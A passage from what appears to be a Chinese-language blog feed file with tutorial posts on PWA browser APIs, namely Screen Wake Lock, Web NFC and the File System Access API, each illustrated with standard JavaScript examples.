class="keyword">await</span> navigator.<span class="property">wakeLock</span>.<span class="title function_">request</span>();</span><br><span class="line">      <span class="comment">// 3. 透過 released 這個狀態去偵測是否啟動</span></span><br><span class="line">      wakeLock.<span class="title function_">addEventListener</span>(<span class="string">&quot;release&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Screen Wake Lock released:&quot;</span>, wakeLock.<span class="property">released</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Screen Wake Lock released:&quot;</span>, wakeLock.<span class="property">released</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`<span class="subst">$&#123;err.name&#125;</span>, <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 啟動喚醒鎖</span></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">requestWakeLock</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 五秒後釋放</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    wakeLock.<span class="title function_">release</span>();</span><br><span class="line">    wakeLock = <span class="literal">null</span>;</span><br><span class="line">  &#125;, <span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo 的站台:</p><p><a href="https://wake-lock-demo.glitch.me/">https://wake-lock-demo.glitch.me/</a></p><h2 id="喚醒鎖個案研討"><a href="#喚醒鎖個案研討" class="headerlink" title="喚醒鎖個案研討"></a>喚醒鎖個案研討</h2><p>Betty Crocker 是美國烹飪指導和食譜開發的一個網站，MAU 超過 1200 萬，對於食譜 App 的用戶來說會希望在烹飪的過程中螢幕可以維持長亮，在導入喚醒鎖後甚至不再維護雙平台的 App。</p><p>在導入喚醒鎖的過程中，技術團隊也嘗試實作一小時內沒有任何活動後禁用喚醒鎖的功能。但最終選擇是在網站上的所有食譜頁面上加入了切換開關。</p><p><img src="https://web-dev.imgix.net/image/admin/uWpEHKUQjInjnw4h1YIC.jpg?auto=format&w=845"></p><p><a href="https://web.dev/betty-crocker/">BettyCrocker.com 在導入喚醒鎖後得到以下結果</a>：</p><ul><li>在瀏覽器支援 Wake Lock API 的所有用戶中，3.5% 的用戶立即啟用了該功能，為前 5 名操作</li><li>啟用喚醒鎖定的用戶的 session 持續時間比未啟用的用戶長 3.1 倍</li><li>啟用喚醒鎖定的用戶的跳出率比未使用喚醒鎖定功能的用戶低 50%</li><li>與所有用戶相比，喚醒鎖定用戶的購買意向指標高出約 300%</li></ul><blockquote><p>對 Betty Crocker 來說加入了這個功能最大的幫助就是直接找出了最關鍵的消費者。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App NFC</title>
      <link href="/2021/09/19/progressive-web-application/pwa-web-nfc/"/>
      <url>/2021/09/19/progressive-web-application/pwa-web-nfc/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Web-NFC"><a href="#什麼是-Web-NFC" class="headerlink" title="什麼是 Web NFC?"></a>什麼是 Web NFC?</h2><p>NFC (Near Field Communication) 近場通訊是高頻 (13.56 MHz) 短距離無線通訊技術，只要距離 5-10 公分內 Web NFC 就能夠讀取和寫入 NFC 標籤，傳輸速率高達 424 kbit&#x2F;s。</p><p>目前 Web NFC 只支援 NDEF，尚不支援 ISO-DEP、NFC-A&#x2F;B、NFC-F、HCE。</p><p>Demo 站台如下，只會示範讀取功能，因為不太確定真的執行寫入悠遊卡會不會壞掉 Orz<br><a href="https://linyencheng.github.io/pwa-web-nfc/">https://linyencheng.github.io/pwa-web-nfc/</a></p><p>Web App 會透過 Page Visibility API 來偵測目前網站是否在 “可見” 的狀態，在可見狀態下才能夠執行掃描讀取或寫入。</p><p>當用戶成功使用其設備掃描 NFC 標籤時，瀏覽器會使用震動來提示。</p><ul><li>如果螢幕關閉或設備被鎖定，則對 NFC 讀取將被中止</li><li>對於不可見的網頁，接收和推送 NFC 內容被暫停，並在網頁再次可見時恢復</li></ul><blockquote><p>Web NFC 示意圖(圖片來源: <a href="https://web-dev/">https://web-dev</a>)<br><img src="https://web-dev.imgix.net/image/admin/jWmCabXZCB6zNwQIR90I.png?auto=format&w=845"></p></blockquote><p>使用 Web NFC 的情境包括：</p><ul><li>博物館中將裝置跟展覽的 Tag 接觸時，可以顯示有關訊息</li><li>商店可以做庫存管理</li><li>馬拉松比賽可以拿來讀取跑友的 RFID</li></ul><h2 id="怎麼使用-NDEFReader"><a href="#怎麼使用-NDEFReader" class="headerlink" title="怎麼使用 NDEFReader?"></a>怎麼使用 NDEFReader?</h2><ol><li>判斷是否支援，接著是取得權限 NDEFReader，只要叫用 scan() 和 write() 就會觸發權限的提示，也可以透過程式觸發。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;NDEFReader&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>) &#123;</span><br><span class="line">  <span class="comment">// 支援</span></span><br><span class="line">  <span class="keyword">const</span> nfcPermissionStatus = <span class="keyword">await</span> navigator.<span class="property">permissions</span>.<span class="title function_">query</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;nfc&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (nfcPermissionStatus.<span class="property">state</span> === <span class="string">&quot;granted&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 有開啟權限</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 未開啟權限</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>new 一個 NDEFReader 然後就可以叫用 scan()，叫用後當 NFC 標籤接近時，NDEFReadingEvent 會觸發事件。<ul><li>reading 成功後會收到兩個屬性<ul><li>serialNumber: 表示設備的序列號（例如 00-11-22-33-44-55-66)，如果沒有，則為空字符串。</li><li>message: 表示存儲在 NFC 標籤中的 NDEF 消息。</li></ul></li><li>寫入時的 option 也有兩種屬性<ul><li>overwrite: 不可覆寫要記得設定為 false</li><li>records: 可以寫入多筆資訊</li></ul></li></ul></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 讀</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">readTag</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> ndef = <span class="keyword">new</span> <span class="title class_">NDEFReader</span>();</span><br><span class="line">    <span class="keyword">await</span> ndef.<span class="title function_">scan</span>();</span><br><span class="line"></span><br><span class="line">    ndef.<span class="title function_">addEventListener</span>(<span class="string">&quot;readingerror&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">log</span>(<span class="string">&quot;讀取錯誤&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    ndef.<span class="title function_">addEventListener</span>(<span class="string">&quot;reading&quot;</span>, <span class="function">(<span class="params">&#123; message, serialNumber &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">log</span>(<span class="string">`&gt; Serial Number: <span class="subst">$&#123;serialNumber&#125;</span>`</span>);</span><br><span class="line">      <span class="title function_">log</span>(<span class="string">`&gt; Records:(<span class="subst">$&#123;message.records.length&#125;</span>)`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;錯誤&quot;</span> + error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 寫</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">writeTag</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> ndef = <span class="keyword">new</span> <span class="title class_">NDEFReader</span>();</span><br><span class="line">    <span class="keyword">await</span> ndef.<span class="title function_">write</span>(<span class="string">&quot;Hello world!&quot;</span>, &#123; <span class="attr">overwrite</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">    <span class="keyword">await</span> ndef.<span class="title function_">write</span>(&#123;</span><br><span class="line">      <span class="attr">records</span>: [</span><br><span class="line">        &#123; <span class="attr">recordType</span>: <span class="string">&quot;url&quot;</span>, <span class="attr">data</span>: <span class="string">&quot;https://w3c.github.io/web-nfc/&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">recordType</span>: <span class="string">&quot;url&quot;</span>, <span class="attr">data</span>: <span class="string">&quot;https://web.dev/nfc/&quot;</span> &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;錯誤&quot;</span> + error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>收到的 message 可能含有多筆 records 這時候可以一筆一筆依照屬性取解析</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> record <span class="keyword">of</span> message.<span class="property">records</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Record type:  &quot;</span> + record.<span class="property">recordType</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MIME type:    &quot;</span> + record.<span class="property">mediaType</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Record id:    &quot;</span> + record.<span class="property">id</span>);</span><br><span class="line">  <span class="keyword">switch</span> (record.<span class="property">recordType</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;text&quot;</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;url&quot;</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>停止操作，透過 <code>AbortController</code> 中的 signal 當成參數送進去 scan()、write() 中可以隨時終止目前的動作。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> abortController = <span class="keyword">new</span> <span class="title class_">AbortController</span>();</span><br><span class="line">abortController.<span class="property">signal</span>.<span class="property">onabort</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ndef = <span class="keyword">new</span> <span class="title class_">NDEFReader</span>();</span><br><span class="line"><span class="keyword">await</span> ndef.<span class="title function_">scan</span>(&#123; <span class="attr">signal</span>: abortController.<span class="property">signal</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> ndef.<span class="title function_">write</span>(<span class="string">&quot;Hello world&quot;</span>, &#123; <span class="attr">signal</span>: abortController.<span class="property">signal</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">abortAction</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  abortController.<span class="title function_">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">abortAction</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 存取本機檔案</title>
      <link href="/2021/09/18/progressive-web-application/pwa-file-system-access/"/>
      <url>/2021/09/18/progressive-web-application/pwa-file-system-access/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-File-System-Access-API"><a href="#什麼是-File-System-Access-API" class="headerlink" title="什麼是 File System Access API?"></a>什麼是 File System Access API?</h2><p>透過這個 File System Access API 就能透過程式操作本機上的檔案，舉例來說像是開啟或儲存檔案等，部分瀏覽器會需要給予相關的權限才能進行操作，除了開啟檔案 API 本身也提供了開啟目錄並列舉檔案列表的功能。</p><p>對 Progressive Web App 也會在某些情境需要可以存取和操作本機端的檔案，Google 的 Lab 提供了底下這個編輯器可以簡單試玩:</p><p><a href="https://googlechromelabs.github.io/text-editor/">https://googlechromelabs.github.io/text-editor/</a></p><p>browser-fs-access library:<br><a href="https://github.com/GoogleChromeLabs/browser-fs-access">https://github.com/GoogleChromeLabs/browser-fs-access</a></p><p>小編在幾年前剛學習 SPA 時也寫了個單頁筆記的應用，能夠快速的寫一些筆記，也附上原始碼和 Demo 連結。</p><p>原始碼: <a href="https://github.com/LinYenCheng/vue-note">https://github.com/LinYenCheng/vue-note</a><br>Demo 連結: <a href="https://linyencheng.github.io/vue-note/">https://linyencheng.github.io/vue-note/</a></p><h2 id="透過瀏覽器讀取本機檔案"><a href="#透過瀏覽器讀取本機檔案" class="headerlink" title="透過瀏覽器讀取本機檔案"></a>透過瀏覽器讀取本機檔案</h2><p>前幾年小編其實沒有使用過 File System Access API，所以顯然在操作上其實有兩種方式，那第一種是透過原生的 <code>input</code> 然後指定 <code>type</code> 為 <code>file</code> 就可以達到讀取的效果，第二種是透過 File System Access API 的 <code>showOpenFilePicker()</code>。</p><ol><li>直接在 html 中加入 <code>&lt;input type=&quot;file&quot; id=&quot;fileInput&quot;&gt;</code> 並且簡單撰寫相關事件就能夠使用，程式碼如下:</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fileInput&quot;</span>);</span><br><span class="line"></span><br><span class="line">fileInput.<span class="title function_">addEventListener</span>(<span class="string">&quot;change&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> textType = <span class="regexp">/text.*/</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (file.<span class="property">type</span>.<span class="title function_">match</span>(textType)) &#123;</span><br><span class="line">    <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line"></span><br><span class="line">    reader.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">      maindata.<span class="property">gridData</span> = [];</span><br><span class="line">      <span class="keyword">var</span> objText = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(reader.<span class="property">result</span>.<span class="title function_">toString</span>());</span><br><span class="line">      objText.<span class="property">gridData</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">element, index</span>) &#123;</span><br><span class="line">        maindata.<span class="property">gridData</span>.<span class="title function_">push</span>(element);</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(objText);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    reader.<span class="title function_">readAsText</span>(file);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fileDisplayArea.<span class="property">innerText</span> = <span class="string">&quot;File not supported!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>使用 File System Access API 中的 <code>showOpenFilePicker()</code>，最後取得的 File object 包含會一個 blob 可以透過以下的方法去取得相關的值:</li></ol><ul><li>slice()</li><li>stream()</li><li>text()</li><li>arrayBuffer()</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fileHandle;</span><br><span class="line">butOpenFile.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">  [fileHandle] = <span class="keyword">await</span> <span class="variable language_">window</span>.<span class="title function_">showOpenFilePicker</span>(&#123;</span><br><span class="line">    <span class="comment">// 可以提供預設</span></span><br><span class="line">    <span class="attr">startIn</span>: <span class="string">&quot;pictures&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> file = <span class="keyword">await</span> fileHandle.<span class="title function_">getFile</span>();</span><br><span class="line">  <span class="keyword">const</span> contents = <span class="keyword">await</span> file.<span class="title function_">text</span>();</span><br><span class="line">  textArea.<span class="property">value</span> = contents;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>showOpenFilePicker</code> 中的 <code>startIn</code> 提供的預設值是常見的幾個資料夾，能夠提供指定</p><ul><li>desktop</li><li>documents</li><li>downloads</li><li>music</li><li>pictures</li><li>videos</li></ul><h2 id="透過瀏覽器寫入本機檔案"><a href="#透過瀏覽器寫入本機檔案" class="headerlink" title="透過瀏覽器寫入本機檔案"></a>透過瀏覽器寫入本機檔案</h2><p>操作上一樣會有兩種方式，第一種是產生出一個下載連結，將 Blob 檔案透過下載的方式寫入，第二種是透過 File System Access API 的 <code>showSaveFilePicker()</code>。</p><ol><li>將需要寫入的內容先產生成 Blob 然後產生成下載連結，最後透過程式去點擊連結去觸發開啟選擇寫入資料夾的視窗。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">saveFile</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="keyword">new</span> <span class="title class_">Blob</span>([text], &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;text/plain;&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// If we are replacing a previously generated file we need to</span></span><br><span class="line">  <span class="comment">// manually revoke the object URL to avoid memory leaks.</span></span><br><span class="line">  <span class="keyword">if</span> (url !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(url);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;exportText&quot;</span>);</span><br><span class="line">  link.<span class="property">href</span> = url;</span><br><span class="line">  <span class="keyword">var</span> filename = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;輸入檔名&quot;</span>) || <span class="string">&quot;export&quot;</span>;</span><br><span class="line">  link.<span class="property">download</span> = filename + <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">  link.<span class="title function_">click</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>透過 <code>showSaveFilePicker()</code> 開啟選擇寫入資料夾的視窗。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fileHandle = <span class="keyword">await</span> self.<span class="title function_">showSaveFilePicker</span>(&#123;</span><br><span class="line">  <span class="attr">suggestedName</span>: <span class="string">&quot;Untitled Text.txt&quot;</span>,</span><br><span class="line">  <span class="attr">types</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">description</span>: <span class="string">&quot;Text documents&quot;</span>,</span><br><span class="line">      <span class="attr">accept</span>: &#123;</span><br><span class="line">        <span class="string">&quot;text/plain&quot;</span>: [<span class="string">&quot;.txt&quot;</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">writeFile</span>(<span class="params">fileHandle, contents</span>) &#123;</span><br><span class="line">  <span class="comment">// Create a FileSystemWritableFileStream to write to.</span></span><br><span class="line">  <span class="keyword">const</span> writable = <span class="keyword">await</span> fileHandle.<span class="title function_">createWritable</span>();</span><br><span class="line">  <span class="comment">// Write the contents of the file to the stream.</span></span><br><span class="line">  <span class="keyword">await</span> writable.<span class="title function_">write</span>(contents);</span><br><span class="line">  <span class="comment">// Close the file and write the contents to disk.</span></span><br><span class="line">  <span class="keyword">await</span> writable.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="透過瀏覽器刪除本機檔案"><a href="#透過瀏覽器刪除本機檔案" class="headerlink" title="透過瀏覽器刪除本機檔案"></a>透過瀏覽器刪除本機檔案</h2><p>這個之前小編就沒有試過其他方式，那透過 File System Access API 的 <code>removeEntry()</code> 是可以做到刪除檔案和刪除資料夾所有內容的效果。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 刪除檔案</span></span><br><span class="line"><span class="keyword">await</span> directoryHandle.<span class="title function_">removeEntry</span>(<span class="string">&quot;Abandoned Projects.txt&quot;</span>);</span><br><span class="line"><span class="comment">// 刪除資料夾所有內容</span></span><br><span class="line"><span class="keyword">await</span> directoryHandle.<span class="title function_">removeEntry</span>(<span class="string">&quot;Old Stuff&quot;</span>, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure><h2 id="透過瀏覽器開啟目錄"><a href="#透過瀏覽器開啟目錄" class="headerlink" title="透過瀏覽器開啟目錄"></a>透過瀏覽器開啟目錄</h2><p>File System Access API 的 <code>showDirectoryPicker()</code> 提供了我們操作目錄並列舉內容的功能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> dirHandle = <span class="keyword">await</span> <span class="variable language_">window</span>.<span class="title function_">showDirectoryPicker</span>();</span><br><span class="line"><span class="keyword">for</span> <span class="title function_">await</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> dirHandle.<span class="title function_">values</span>()) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(entry.<span class="property">kind</span>, entry.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="File-System-Access-API-權限"><a href="#File-System-Access-API-權限" class="headerlink" title="File System Access API 權限"></a>File System Access API 權限</h2><p>部分瀏覽器環境還是會有權限的問題，所以偵測權限相關就變成也是要寫在程式碼裡，邏輯如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">verifyPermission</span>(<span class="params">fileHandle, readWrite</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> options = &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (readWrite) &#123;</span><br><span class="line">    options.<span class="property">mode</span> = <span class="string">&quot;readwrite&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 看是否已同意</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">await</span> fileHandle.<span class="title function_">queryPermission</span>(options)) === <span class="string">&quot;granted&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 看這次有沒有要成功</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">await</span> fileHandle.<span class="title function_">requestPermission</span>(options)) === <span class="string">&quot;granted&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 被拒絕</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 用戶端儲存與快取</title>
      <link href="/2021/09/16/progressive-web-application/pwa-web-storage/"/>
      <url>/2021/09/16/progressive-web-application/pwa-web-storage/</url>
      
